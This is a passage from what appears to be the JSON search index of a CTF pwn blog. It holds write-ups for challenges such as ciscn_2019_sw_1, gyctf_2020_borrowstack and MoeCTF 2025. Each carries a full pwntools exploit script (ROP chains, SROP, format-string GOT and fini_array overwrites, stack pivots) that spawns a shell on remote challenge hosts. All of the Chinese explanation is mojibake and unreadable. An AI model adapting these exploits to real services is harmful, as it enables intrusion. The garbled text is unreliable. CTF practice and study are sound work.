&#x27;splitw&#x27;, &#x27;-h&#x27;] p = process(&#x27;./ciscn_s_3&#x27;)#p = remote(&#x27;node4.buuoj.cn&#x27;,29591)pop_rdi_ret = 0x4005a3syscall = 0x400501vul_addr = 0x4004edret_addr = 0x4003a9vul_addr = 0x4004edpayload = b&#x27;a&#x27; * 0x10 + p64(vul_addr)p.send(payload)#sys_write æ˜¯ vuln å‡½æ•°ä½“çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒåœ¨å‡½æ•°è¿”å›ä¹‹å‰å°±å·²ç»æ‰§è¡Œäº†ã€‚#sys_writeä¼šè¾“å‡ºå†™å…¥ buf çš„ 16 ä¸ª aï¼Œä»¥åŠç´§éšå…¶åçš„æ ˆä¸Š 32 ä¸ªå­—èŠ‚çš„å†…å®¹ã€‚è¿™ 32 ä¸ªå­—èŠ‚å°±åŒ…å«äº†è¢«ä½ è¦†ç›–çš„è¿”å›åœ°å€ã€‚p.recv(0x20)stack_addr = u64(p.recv(8))print(hex(stack_addr))buf_addr = stack_addr-0x118#buf_addr = stack_addr-0x148gdb.attach(p)payload = p64(ret_addr) + b&#x27;/bin/sh\\00&#x27;payload += p64(0x4004e2) # rax=0x3bpayload += p64(0x40059a) # rdx = 0payload += p64(0) + p64(1) # rbx = 0, rbp = 1payload += p64(buf_addr) + p64(0) * 3 # r12 = buf_addrpayload += p64(0x400580)payload += p64(0) * 7\t\tpayload += p64(pop_rdi_ret) + p64(buf_addr + 8) # rdi = &amp;&#x27;/bin/sh\\0&#x27;payload += p64(syscall)#payload += p64(vul_addr)&#x27;&#x27;&#x27;sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = buf_addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rip = syscallpayload = b&#x27;/bin/sh\\0&#x27;.ljust(0x10, b&#x27;a&#x27;) + p64(0x4004da) + p64(syscall) + bytes(sigframe)&#x27;&#x27;&#x27;p.send(payload)p.interactive()\n\n\n\n","categories":["exercise_pwn"],"tags":["PWN","gdb","csu","SROP"]},{"title":"ciscn_2019_sw_1","url":"/2025/07/22/ciscn-2019-sw-1/","content":"\n\n\nå­˜åœ¨systemå‡½æ•°ï¼Œä¸éœ€è¦æ³„éœ²libcçš„åœ°å€\nç›´æ¥æŠŠprintfçš„gotè¡¨åœ°å€è¦†ç›–ä¸ºsystemå‡½æ•°çš„åœ°å€ï¼Œç„¶åä¼ é€’å‚æ•°ä¸ºâ€œ&#x2F;bin&#x2F;shâ€å³å¯\nè€Œä¸”åç§»æ˜¯4\nä½†æ˜¯è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åªè¢«æ‰§è¡Œäº†ä¸€æ¬¡ï¼Œæ— æ³•å®ç°æ“ä½œ\næ‰€ä»¥è¦ä¿®æ”¹æ”¶å°¾å‡½æ•°çš„åœ°å€ä»¥å®ç°å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å¤šæ¬¡è°ƒç”¨\nç”¨readelfå»æ‰¾fini_arrayçš„åœ°å€\n\nè„šæœ¬\nfrom pwn import *from LibcSearcher import LibcSearcher#p=process(&quot;./ciscn_2019_sw_1&quot;)p=remote(&quot;node5.buuoj.cn&quot;,29318)elf=ELF(&quot;./ciscn_2019_sw_1&quot;)fini=0x0804979cprintf=elf.got[&quot;printf&quot;]main=0x08048534sys=0x080483D0sys_h=(sys&gt;&gt;16)&amp;0xffffsys_l=sys&amp;0xffffmain_h=(main&gt;&gt;16)&amp;0xffffmain_l=main&amp;0xffffpayload=p32(fini+2)+p32(printf+2)+p32(printf)+p32(fini)payload+=b&quot;%&quot;+bytes(str(main_h-16),&quot;utf_8&quot;)+b&quot;c%4$hn&quot;#%cçš„æ„æ€æ˜¯æ‰“å°nä¸ªå­—ç¬¦payload+=b&quot;%5$hn&quot;payload+=b&quot;%&quot;+bytes(str(sys_l-main_h),&quot;utf_8&quot;)+b&quot;c%6$hn&quot;payload+=b&quot;%&quot;+bytes(str(main_l-sys_l),&quot;utf_8&quot;)+b&quot;c%7$hn&quot;payload += b&#x27;\\x00&#x27;p.sendlineafter(b&quot;name?\\n&quot;,payload)payload=b&quot;/bin/sh&quot;p.sendlineafter(b&quot;name?\\n&quot;,payload)p.interactive()\n\n\n\n\n\n\n\næ³¨æ„\nå››ä¸ªå†™å…¥çš„æ•°æ˜¯é€’å¢çš„\nå¦‚ä½•å–é«˜ 16 ä½\n\nåœ°å€å³ç§» 16 ä½ï¼šsystem_plt &gt;&gt; 16\n\næŠŠé«˜ 16 ä½â€œç§»åˆ°â€æœ€ä½ä½\n\nå¯¹äº 0x080483d0ï¼š\n0x080483d0 &gt;&gt; 16  = 0x0804\n\n\nä¸ºä»€ä¹ˆè¿˜è¦ &amp; 0xffffï¼Ÿ\n\nå› ä¸ºé«˜ 16 ä½è™½ç„¶å·²ç»ç§»åˆ°ä½ä½äº†ï¼Œä½† Python æ•´æ•°æ²¡æœ‰â€œæº¢å‡ºâ€æ¦‚å¿µã€‚\nä¸ºäº†ç¡®ä¿æœ€ç»ˆç»“æœåªä¿ç•™ä½ 16 ä½ï¼ˆå³æœ€å¤§ä¸è¶…è¿‡ 0xffffï¼‰ï¼Œå°±ç”¨æ©ç  0xffff å–æœ€ä½ 16 ä½ã€‚\n\n\n\nb&#x27;%&#x27; + bytes(str(xxx), &quot;utf-8&quot;) + b&#x27;c%4$hn&#x27;\n\nè¿™é‡Œçš„å«ä¹‰æ˜¯ï¼š\n\nè¿™ä¸²å­—ç¬¦ä¸²æ‹¼æ¥åæ˜¯å•¥æ ·ï¼Ÿä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾ xxx &#x3D; 100ï¼Œæ‹¼æ¥ç»“æœæ˜¯ï¼š\n\nb&#x27;%100c%4$hn&#x27;\n\n\nè¿™åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²é‡Œçš„æ„æ€%100c ï¼šå‘è¾“å‡ºç¼“å†²åŒºå†™å…¥ 100ä¸ªç©ºæ ¼å­—ç¬¦ï¼Œä½¿å¾—â€œå·²ç»è¾“å‡ºå­—ç¬¦æ•°â€åŠ 100ã€‚\n\n%4$hn ï¼šæŠŠå½“å‰çš„è¾“å‡ºå­—ç¬¦æ•°ï¼ˆç°åœ¨åº”è¯¥æ˜¯å‰é¢å·²æœ‰å­—ç¬¦æ•° + 100ï¼‰å†™å…¥ ç¬¬4ä¸ªå‚æ•°æŒ‡å‘çš„åœ°å€ï¼Œå†™å…¥2å­—èŠ‚ã€‚\nä¸ºä»€ä¹ˆä¸ç”¨ %n ç›´æ¥å†™ 4 å­—èŠ‚ï¼Ÿï¼ˆä¸¤ä¸ªå­—èŠ‚ç”¨hn,å››å­—èŠ‚ç”¨nï¼‰\nç†è®ºä¸Šå¯ä»¥ç›´æ¥ç”¨ %n ä¸€æ¬¡å†™å®Œæ•´ 4 å­—èŠ‚ï¼ˆä¸€ä¸ª intï¼‰ï¼Œä½†æ˜¯ï¼š\n1ï¸âƒ£ æ•°å­—èŒƒå›´çš„é—®é¢˜\n\nå¦‚æœä½ æƒ³å†™çš„æ•°æ˜¯ï¼š\nå¤åˆ¶ç¼–è¾‘0x08048534\n\né‚£å°±æ˜¯ï¼š134513204ï¼ˆåè¿›åˆ¶ï¼‰ï¼Œè€Œæ ¼å¼åŒ–å­—ç¬¦ä¸²é‡Œçš„è¾“å‡ºå­—ç¬¦æ•°å¿…é¡»åˆšå¥½æ˜¯è¿™ä¸ªæ•°æ‰èƒ½å†™å‡ºæ¥ã€‚\n\nä½ éœ€è¦è¾“å‡º 134,513,204 ä¸ªå­—ç¬¦æ‰èƒ½è®© %n å†™å‡ºè¿™ä¸ªæ•°â€¦â€¦æ˜¾ç„¶ä¸ç°å®ï¼Œç¨‹åºå¾ˆå¯èƒ½å´©æºƒæˆ–è¶…æ—¶ã€‚\n\n\nfini.arrayåŸç†ğŸ›¡ï¸ 1ï¸âƒ£ RELRO ä¸å„æ®µçš„å¯å†™æ€§\nELF ç¨‹åºé‡Œæœ‰è¿™å‡ ä¸ªå…³é”®çš„è¡¨&#x2F;æ®µï¼š\n\n\n\næ®µ&#x2F;è¡¨\næ­£å¸¸ä½œç”¨\nä¸ºä»€ä¹ˆèƒ½å†™\nRELROä¿æŠ¤åçš„å˜åŒ–\n\n\n\n.got.plt\nå­˜å‚¨åŠ¨æ€é“¾æ¥å‡½æ•°çš„çœŸå®åœ°å€ï¼ˆlazy bindingåï¼‰\nlazy binding éœ€è¦å†™å…¥çœŸå®åœ°å€\nNO RELRO æ—¶å¯å†™ï¼ŒPARTIAL RELRO ä¹Ÿå¯å†™ï¼ŒFULL RELRO æ—¶ä¸å¯å†™\n\n\n.init_array\nç¨‹åºå¯åŠ¨æ—¶è°ƒç”¨çš„å‡½æ•°æ•°ç»„\nå­˜å‡½æ•°æŒ‡é’ˆ\nNO RELRO æ—¶å¯å†™ï¼ŒPARTIAL&#x2F;FULL æ—¶ä¸å¯å†™\n\n\n.fini_array\nç¨‹åºé€€å‡ºæ—¶è°ƒç”¨çš„å‡½æ•°æ•°ç»„\nå­˜å‡½æ•°æŒ‡é’ˆ\nNO RELRO æ—¶å¯å†™ï¼ŒPARTIAL&#x2F;FULL æ—¶ä¸å¯å†™\n\n\nâœ¨âœ… .fini_array å­˜çš„æ˜¯é€€å‡ºæ—¶è¦è°ƒç”¨çš„å‡½æ•°æŒ‡é’ˆã€‚âœ… åˆ©ç”¨æ—¶å…ˆæŠŠ .fini_array=mainï¼Œé€€å‡ºæ—¶é‡å¯ mainï¼Œç»™ä½ å¤šä¸€æ¬¡åˆ©ç”¨æœºä¼šã€‚âœ… é€šå¸¸ .fini_array åªæœ‰ä¸€ä¸ªæŒ‡é’ˆçš„ä½ç½®ï¼Œåªèƒ½å†™ä¸€ä¸ªã€‚\nğŸ” ä¸ºä»€ä¹ˆ .fini_array èƒ½å¸®å¿™\nå› ä¸ºï¼š 1ï¸âƒ£ ç¨‹åºé€€å‡ºæ—¶ï¼Œlibc ä¼šä¸»åŠ¨å»éå† .fini_arrayï¼Œæ‰§è¡Œé‡Œé¢çš„å‡½æ•°æŒ‡é’ˆã€‚ 2ï¸âƒ£ é»˜è®¤ .fini_array[0] æŒ‡å‘æŸä¸ªæ”¶å°¾å‡½æ•°ã€‚ 3ï¸âƒ£ å¦‚æœä½ æŠŠ .fini_array[0] æ”¹æˆ main çš„åœ°å€ï¼Œé‚£ç¨‹åºåœ¨é€€å‡ºæ—¶å°±ä¼šå†ä¸€æ¬¡è°ƒç”¨ mainï¼Œç›¸å½“äºé‡å¯äº†ç¨‹åºã€‚\næ”¶å°¾å‡½æ•°ã€æ˜¯ç¨‹åºé€€å‡ºï¼ˆæˆ–ç»“æŸï¼‰å‰ï¼Œæ“ä½œç³»ç»Ÿæˆ–è¿è¡Œæ—¶ç¯å¢ƒä¼šè°ƒç”¨è¿™äº›å‡½æ•°æ¥åšå–„åå·¥ä½œã€‚\næµç¨‹å¤§è‡´æ˜¯ï¼š\nmain å‡½æ•°æ‰§è¡Œ â†’ main è¿”å› â†’ è¿è¡Œæ—¶å¼€å§‹è°ƒç”¨â€œæ”¶å°¾å‡½æ•°â€ â†’ èµ„æºé‡Šæ”¾å®Œæ¯• â†’ ç¨‹åºå®Œå…¨é€€å‡º\n\nsendlineafter() vs sendafter() çš„åŒºåˆ«\n\n\nå‡½æ•°\nè¡Œä¸º\næ˜¯å¦è‡ªåŠ¨åŠ  \\n\né€‚ç”¨åœºæ™¯\n\n\n\nsendlineafter()\nç­‰å¾…ç‰¹å®šå­—ç¬¦ä¸²å‡ºç°åå‘é€æ•°æ®ï¼Œè‡ªåŠ¨åœ¨æœ«å°¾åŠ  \\nï¼ˆæ¢è¡Œç¬¦ï¼‰\nâœ… æ˜¯\né€‚ç”¨äºéœ€è¦æ¢è¡Œç¬¦çš„äº¤äº’ï¼ˆå¦‚ scanfã€getsã€fgetsï¼‰\n\n\nsendafter()\nç­‰å¾…ç‰¹å®šå­—ç¬¦ä¸²å‡ºç°åå‘é€æ•°æ®ï¼Œä¸è‡ªåŠ¨åŠ  \\n\nâŒ å¦\né€‚ç”¨äºä¸éœ€è¦æ¢è¡Œç¬¦çš„äº¤äº’ï¼ˆå¦‚ readã€recvï¼‰\n\n\nåœ¨è¿™é‡Œæˆ‘ä»¬æ˜¯ç”¨scanfè¯»å–æ•°æ®ï¼Œå®ƒåœ¨è¯»å–åˆ°&#x2F;næ—¶æ‰ä¼šåœæ­¢ï¼Œæ‰€ä»¥è¦ç”¨sendlineafter()\n","categories":["exercise_pwn"],"tags":["PWN","fini_array","åˆ†å­—èŠ‚"]},{"title":"MoeCTF 2025","url":"/2025/08/17/MoeCTF-2025/","content":"100find itï¼ˆfdï¼‰\ndupå›èµ‹å€¼è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦1çš„åŠŸèƒ½ï¼Œæ‰€ä»¥åœ¨close(1)ä¹‹ååªèƒ½é€šè¿‡dup(1)å¤åˆ¶çš„å€¼3æ¥ä½œä¸ºè¾“å‡ºåˆ°ç»ˆç«¯çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä¼šäº§ç”Ÿæ–°çš„æ–‡ä»¶æè¿°ç¬¦çš„åªæœ‰openå’Œdupç­‰å‡½æ•°\nwriteå’Œreadæ˜¯è°ƒç”¨ä»–\næ‰€ä»¥æ¥ä¸‹æ¥ï¼Œopen()å‡½æ•°è¦äº§ç”Ÿæ–°çš„å°çš„æ–‡ä»¶æè¿°ç¬¦æ¥æŒ‡å®šæ–‡ä»¶ä½ç½®\nä¹Ÿå°±æ˜¯1\næ‰€ä»¥è„šæœ¬\nfrom pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#p = process(&quot;./fd&quot;)p=remote(&quot;192.168.145.1&quot;,20880)sh_shellcode = asm(shellcraft.sh())p.recvuntil(b&quot;I&#x27;ve hidden the fd of stdout. Can you find it?&quot;)p.sendline(b&quot;3&quot;)p.recvuntil(b&quot;You are right.What would you like to see?&quot;)p.sendline(b&quot;flag&quot;)p.recvuntil(b&quot;What is its fd?&quot;)p.sendline(b&quot;1&quot;)p.interactive()\n\n\n\n\n\nè®¤è¯†libc\n\næ¥æ”¶printfçš„åœ°å€ï¼Œç”¨æ¥æ³„éœ²libcåœ°å€\nä½†æ˜¯æŸ¥çœ‹ROPå‘½ä»¤æŸ¥çœ‹elfçš„pop|retå‘ç°ä¸å¤Ÿï¼Œæ‰€ä»¥ç”¨libcæ–‡ä»¶çš„\n\nåŸºå€åŠ ä¸Šåç§»å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥å¯ä»¥æ­£ç¡®æ”¾ç½®å‚æ•°\næ„é€ åé—¨å‡½æ•°\nfrom pwn import *context.arch = &#x27;amd64&#x27;context.os = &#x27;linux&#x27;context.log_level = &#x27;debug&#x27;libc = ELF(&quot;./libc.so.6&quot;)elf = ELF(&quot;./libc&quot;)#p=process(&quot;./libc&quot;)p = remote(&quot;192.168.145.1&quot;, 26565)p.recvuntil(&quot;printf&#x27;: 0x&quot;)printf_addr_str = p.recvline().strip()printf = int(printf_addr_str, 16)log.info(&quot;Leaked printf address: &quot; + hex(printf))libc_base = printf - libc.symbols[&quot;printf&quot;]log.success(&quot;Libc base: &quot; + hex(libc_base))rdi=libc_base+0x000000000002a3e5system=libc_base+libc.symbols[&quot;system&quot;]bin=libc_base+0x1d8678p.recvuntil(b&quot;&gt;&quot;)payload = b&quot;A&quot; *72payload+=p64(rdi)+p64(bin)+p64(0x40101a)+p64(system)p.sendline(payload)p.interactive()\n\n\n\n\n\n\n\n150ezpivotæ ˆè¿ç§»\næ³¨æ„è¦ç”¨ret*0x100æŠŠæ ˆåœ°å€æŠ¬é«˜\nè„šæœ¬\n#!/usr/bin/env python3# -*- coding: utf-8 -*-&quot;&quot;&quot;Basic PWN Template - Normal Template Author: p0ach1lDate: 2025-08-19Target: no description&quot;&quot;&quot;from pwn import *from ctypes import *from LibcSearcher import *from pwnscript import *filename = &quot;./ezpivot&quot;url = &#x27;127.0.0.1:33113&#x27;gdbscript = &#x27;&#x27;&#x27;  b * 0x000000000040130B  b * 0x000000000040133E&#x27;&#x27;&#x27;set_context(log_level=&#x27;debug&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, timeout=5)p = pr(url=url , filename=filename , gdbscript=gdbscript , framepath=&#x27;&#x27;)elf = ELF(filename)desc = 0x0000000000404060binsh_addr = 0x404880pop_rdi = 0x0000000000401219leave_ret = 0x000000000040133Eret = 0x000000000040133Fsystem_plt = elf.plt[&#x27;system&#x27;]system_addr = 0x000000000401230p.sendlineafter(&quot;length of your introduction.\\n&quot; , b&#x27;-1&#x27;)payload = p64(ret) * 0x100 +  p64(pop_rdi) + p64(0x404880) + p64(ret) + p64(system_addr) + b&quot;/bin/sh\\x00&quot;p.sendline(payload)payload = b&#x27;a&#x27; * 0xc + p64(desc - 0x8) + p64(leave_ret)p.sendlineafter(&quot;Now, please tell us your phone number:\\n&quot; , payload)p.interactive()\n\n\n\n\n\nfmtæ‰¾åˆ°ä¸¤ä¸ªå‚æ•°çš„ä½ç½®æ³„éœ²å‡ºæ¥\nè„šæœ¬\n#!/usr/bin/env python3# -*- coding: utf-8 -*-&quot;&quot;&quot;Basic PWN Template - Normal Template Author: p0ach1lDate: 2025-08-09Target: no description&quot;&quot;&quot;from pwn import *from ctypes import *from LibcSearcher import *from pwnscript import *filename = &quot;./pwn4&quot;url = &#x27;127.0.0.1:39821&#x27;gdbscript = &#x27;&#x27;&#x27;  b * $rebase(0x0000000000001485)  b * $rebase(0x00000000000014C4)&#x27;&#x27;&#x27;set_context(log_level=&#x27;debug&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, timeout=5)p = pr(url=url , filename=filename , gdbscript=gdbscript , framepath=&#x27;&#x27;)elf = ELF(filename)payload = b&#x27;%7$s---%10$p----&#x27;p.sendlineafter(&quot;Hey there, little one, what&#x27;s your name?&quot; , payload)p.recvuntil(&quot;Nice to meet you,&quot;)str1 = p.recvuntil(&quot;---&quot; , drop=True)str2 = p.recvuntil(&quot;---&quot; , drop=True).decode()str2 = bytes.fromhex(str2[2:])[::-1].decode(&quot;utf-8&quot;)print(&quot;=======1111&quot; , str1)print(&quot;=======2222&quot; , str2)p.sendlineafter(&quot;I buried two treasures on the stack.Can you find them?\\n&quot; , str2)p.sendlineafter(&quot;Yeah,another one?&quot; , str1)p.interactive()\n\n","categories":["WP"],"tags":["WP"]},{"title":"gyctf_2020_borrowstack","url":"/2025/07/29/gyctf-2020-borrowstack/","content":"é¢˜ç›®\n\n\næ€è·¯ï¼š\nbankæ˜¯bssæ®µä¸Šçš„ï¼Œæ ˆç©ºé—´ä¸è¶³,æŠŠæ³„éœ²libcçš„ä¸œè¥¿æ”¾åœ¨bankä¸Šï¼Œé€šè¿‡bufè·³è½¬åˆ°bankæ³„éœ²libcå»æ‰¾åˆ°libcåŸºå€\nç„¶ååŠ ä¸Šå¯¹åº”libcçš„one_gadgetåç§»ï¼Œè·³è½¬è¿‡å»æ‰§è¡Œong_gadgatå°±å¯ä»¥äº†\nè„šæœ¬from pwn import *from LibcSearcher import *#p=process(&quot;./gyctf_2020_borrowstack&quot;)p=remote(&quot;node5.buuoj.cn&quot;,27049)elf=ELF(&quot;./gyctf_2020_borrowstack&quot;)bank=0x0000000000601080leave=0x400699rdi=0x0400703ret=0x4004c9puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]main=0x400626payload1=b&#x27;a&#x27;*0x60+p64(bank)+p64(leave)p.recvuntil(b&quot;want&quot;)p.send(payload1)p.recvuntil(b&quot;now!&quot;)payload2=p64(ret)*20+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.send(payload2)a=p.recvline()puts= u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(puts))libc=LibcSearcher(&quot;puts&quot;,puts)libc_base=puts-libc.dump(&quot;puts&quot;)one=libc_base+0x4526apayload=b&#x27;a&#x27;*0x68+p64(one)p.sendline(payload)p.interactive()\n\n\n\n\n\næ”¶è·p64(ret)*0x20åŸå› å½“ main å‡½æ•°å†æ¬¡è¢«æ‰§è¡Œæ—¶ï¼ˆå› ä¸ºä½ çš„ ROP é“¾æœ€åè·³è½¬åˆ°äº† main å‡½æ•°çš„åœ°å€ï¼‰ï¼š\n\nç¨‹åºä¼šä¸ºæ–°çš„ main å‡½æ•°è°ƒç”¨é‡æ–°åˆ†é…ä¸€ä¸ªæ ˆå¸§ã€‚\n\nåœ¨è¿™ä¸ªæ–°çš„æ ˆå¸§ä¸­ï¼Œä¼šå†æ¬¡ä¸ºå±€éƒ¨å˜é‡ buf[96] åˆ†é…ç©ºé—´ã€‚\n\n\nä¸ºä»€ä¹ˆâ€œä¸´æ—¶å˜é‡çš„ç©ºé—´ä¼šè¦†ç›–åˆ° GOT è¡¨â€ï¼Ÿ\nè¿™é‡Œå°±æ˜¯å…³é”®ç‚¹ã€‚åœ¨ 64 ä½ç¨‹åºä¸­ï¼Œæ ˆæ˜¯å‘ä¸‹å¢é•¿çš„ï¼ˆä»é«˜åœ°å€å‘ä½åœ°å€ï¼‰ã€‚\n\nGOT è¡¨é€šå¸¸åœ¨ç¨‹åºçš„ä½åœ°å€åŒºåŸŸã€‚ ï¼ˆä¾‹å¦‚ï¼š0x0601018ï¼‰\nbank å˜é‡åœ¨ .bss æ®µï¼Œé€šå¸¸åœ°å€æ¯” GOT è¡¨é«˜ã€‚ ï¼ˆä¾‹å¦‚ï¼š0x0601080ï¼‰\næ ˆä¼šå‘ä¸‹å¢é•¿ã€‚ å½“ main å‡½æ•°å†æ¬¡è¢«è°ƒç”¨ï¼Œå¹¶ä¸”å®ƒåœ¨å †æ ˆä¸Šåˆ†é… buf ç­‰å±€éƒ¨å˜é‡æ—¶ï¼Œè¿™äº›å˜é‡ä¼šå ç”¨ rsp å‘ä¸‹å¢é•¿çš„å†…å­˜ç©ºé—´ã€‚\n\nç°åœ¨æƒ³è±¡ä¸€ä¸‹ï¼š\n\nä½ çš„æ ˆè¿ç§»ï¼ŒæŠŠ rsp è®¾ç½®åˆ°äº† bank å¤„ï¼ˆä¾‹å¦‚ 0x0601080ï¼‰ã€‚\nä½ ç”¨ p64(ret)*20 æŠŠä½ çš„ ROP é“¾æ¨åˆ°äº† bank + 160 (ä¾‹å¦‚ 0x0601120)ã€‚\nä½ çš„ ROP é“¾æ‰§è¡Œï¼Œæ³„æ¼ puts åœ°å€ã€‚\nç„¶åï¼Œä½ çš„ ROP é“¾æœ€åæ‰§è¡Œ p64(main)ï¼Œå¯¼è‡´ç¨‹åºè·³è½¬å› main å‡½æ•°çš„å¼€å¤´ã€‚\nå½“ main å‡½æ•°å†æ¬¡æ‰§è¡Œæ—¶ï¼Œå®ƒä¼šåœ¨æ ˆä¸Šé‡æ–°åˆ†é…ç©ºé—´ã€‚ æ­¤æ—¶ï¼Œæ–°çš„æ ˆå¸§å¯èƒ½ä¼šä» rsp çš„å½“å‰ä½ç½®ï¼ˆå³ 0x0601120ï¼Œä¹Ÿå°±æ˜¯ä½ çš„ ROP é“¾æœ€åæ‰§è¡Œå®Œçš„ä½ç½®ï¼‰å¼€å§‹å‘ä¸‹ï¼ˆå‘ä½åœ°å€ï¼‰å¢é•¿ã€‚\nå¦‚æœ main å‡½æ•°åˆ†é…çš„å±€éƒ¨å˜é‡ï¼ˆä¾‹å¦‚ buf[96]ï¼‰çš„æ–°ç©ºé—´ï¼Œåœ¨æ ˆå‘ä¸‹å¢é•¿çš„è¿‡ç¨‹ä¸­ï¼Œæ°å¥½â€œè¦†ç›–â€åˆ°äº† GOT è¡¨æ‰€åœ¨çš„å†…å­˜åŒºåŸŸï¼ˆä¾‹å¦‚ 0x0601018ï¼‰ï¼Œé‚£ä¹ˆ GOT è¡¨çš„åœ°å€å°±ä¼šè¢«è¿™äº›å±€éƒ¨å˜é‡çš„åƒåœ¾æ•°æ®æ‰€ç ´åã€‚\n\np64(ret)*20 çš„ä½œç”¨\næ‰€ä»¥ï¼Œp64(ret)*20 åœ¨è¿™é‡Œçš„å¦ä¸€ä¸ªé‡è¦ä½œç”¨å°±æ˜¯ï¼š\n\nå®ƒå°†ä½ çš„ä¼ªé€ æ ˆå¸§ï¼ˆå³ä½ å†™å…¥ bank çš„ ROP é“¾ï¼‰å‘é«˜åœ°å€æ–¹å‘æ¨å¾—æ›´è¿œã€‚\nè¿™æ ·ï¼Œå½“ main å‡½æ•°å†æ¬¡è¢«è°ƒç”¨æ—¶ï¼Œå®ƒä¼šä»ä½ ä¼ªé€ æ ˆçš„æœ«å°¾ï¼ˆbank + 160 + ROP é“¾é•¿åº¦ï¼‰å¼€å§‹å‘ä¸‹åˆ†é…æ–°çš„æ ˆå¸§ã€‚\né€šè¿‡æŠŠä½ çš„ä¼ªé€ æ ˆï¼ˆå’Œ rsp çš„ä½ç½®ï¼‰è®¾ç½®åœ¨è¶³å¤Ÿé«˜çš„åœ°å€ï¼Œå¯ä»¥ç¡®ä¿ main å‡½æ•°å†æ¬¡åˆ†é…çš„å±€éƒ¨å˜é‡ç©ºé—´ï¼ˆæ ˆå‘ä¸‹å¢é•¿çš„éƒ¨åˆ†ï¼‰ä¸ä¼šä¾µçŠ¯åˆ°ä½äºä½åœ°å€çš„ GOT è¡¨ã€‚\n\nç”¨å›¾ç¤ºæ¥è¯´æ˜ï¼š\næ²¡æœ‰ p64(ret)\\*20 çš„é£é™©ï¼š\né«˜åœ°å€...0x0601080 &lt;-- bank (rsp è¿ç§»åˆ°è¿™é‡Œ)| pop_rdi || puts_got|  &lt;-- ROPé“¾| puts_plt|| main    |...0x0601018 &lt;-- puts_got (GOTè¡¨)...ä½åœ°å€å½“ main å†æ¬¡è¿è¡Œï¼Œå®ƒå¯èƒ½ä» 0x0601080 é™„è¿‘å‘ä¸‹åˆ†é…æ–°çš„ buf ç©ºé—´ï¼Œè¿™ä¸ª buf ç©ºé—´å¯èƒ½ç›´æ¥è¦†ç›–åˆ° 0x0601018 å¤„çš„ puts_gotã€‚\n\næœ‰äº† p64(ret)\\*20 çš„å¥½å¤„ï¼š\né«˜åœ°å€...0x0601120 &lt;-- bank + 160 (rsp æœ€ç»ˆä¼šåˆ°è¿™é‡Œ)| pop_rdi || puts_got|  &lt;-- ROPé“¾| puts_plt|| main    |...0x0601080 &lt;-- bank (rsp æœ€åˆè¿ç§»åˆ°è¿™é‡Œï¼Œp64(ret)*20 å¡«å……)| ret     || ...     || ret     |...0x0601018 &lt;-- puts_got (GOTè¡¨)...ä½åœ°å€å½“ main å†æ¬¡è¿è¡Œï¼Œå®ƒä¼šä» 0x0601120 é™„è¿‘å‘ä¸‹åˆ†é…æ–°çš„ buf ç©ºé—´ã€‚ç”±äº 0x0601120 è¶³å¤Ÿé«˜ï¼Œå‘ä¸‹åˆ†é…çš„ buf ç©ºé—´ä¸ä¼šåˆ°è¾¾ 0x0601018 çš„ puts_gotã€‚GOTè¡¨å› æ­¤è¢«ä¿æŠ¤äº†ã€‚\n\næ‰€ä»¥ï¼Œè¿™æ®µè§£é‡ŠæŒ‡çš„æ˜¯ï¼šp64(ret)\\*20 èƒ½å¤Ÿå°†ä½ çš„ ROP é“¾çš„â€œèµ·ç‚¹â€æŠ¬é«˜ï¼Œä»è€Œé¿å…å½“ç¨‹åºå†æ¬¡å›åˆ° main å‡½æ•°å¹¶é‡æ–°åˆ†é…æ ˆç©ºé—´æ—¶ï¼Œmain å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼ˆå¦‚ bufï¼‰åœ¨æ ˆå‘ä¸‹å¢é•¿æ—¶ï¼Œå…¶ç©ºé—´ä¸ GOT è¡¨å‘ç”Ÿé‡å ï¼Œè¿›è€Œç ´å GOT è¡¨ã€‚\nè¿™æ˜¯ä¸€ç§éå¸¸å¸¸è§çš„ï¼Œä¹Ÿæ˜¯éå¸¸é‡è¦çš„é˜²å¾¡æ€§ç­–ç•¥ï¼Œç¡®ä¿äº†åç»­æ”»å‡»ï¼ˆä¾‹å¦‚è·å– Shellï¼‰çš„å¯é æ€§ï¼Œå› ä¸ºè¿™äº›æ”»å‡»é€šå¸¸éœ€è¦ä¸€ä¸ªå®Œå¥½æ— æŸçš„ GOT è¡¨æ¥è§£æå‡½æ•°åœ°å€ã€‚\nå¤§å°1.å¯ä»¥ä»ä¸€ä¸ªå°æ•°å¼€å§‹å°è¯•ï¼ˆæ¨èï¼‰\nä¸€èˆ¬æƒ…å†µä¸‹20å°±å¤Ÿäº†\n\n\n\nä¸èƒ½å¤ªå¤§ï¼Œ read(0, &amp;bank, 0x100uLL) å†™å…¥çš„ã€‚è¿™ä¸ª read å‡½æ•°æœ€å¤šåªèƒ½è¯»å– 0x100 (256) å­—èŠ‚ã€‚\n\nä½ çš„ payload é•¿åº¦æ˜¯æœ‰é™åˆ¶çš„ã€‚\np64(ret)*N å æ®çš„å­—èŠ‚æ•°æ˜¯ N * 8ã€‚\nä½ çš„æ ¸å¿ƒ ROP é“¾ (p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)) æœ¬èº«ä¹Ÿéœ€è¦ç©ºé—´ã€‚\np64(pop_rdi): 8 å­—èŠ‚\np64(puts_got): 8 å­—èŠ‚\np64(puts_plt): 8 å­—èŠ‚\np64(main): 8 å­—èŠ‚\næ ¸å¿ƒ ROP é“¾å…± 4 * 8 = 32 å­—èŠ‚ã€‚\n\n\n\nå¦‚æœ N è¿‡å¤§ï¼Œä¾‹å¦‚ 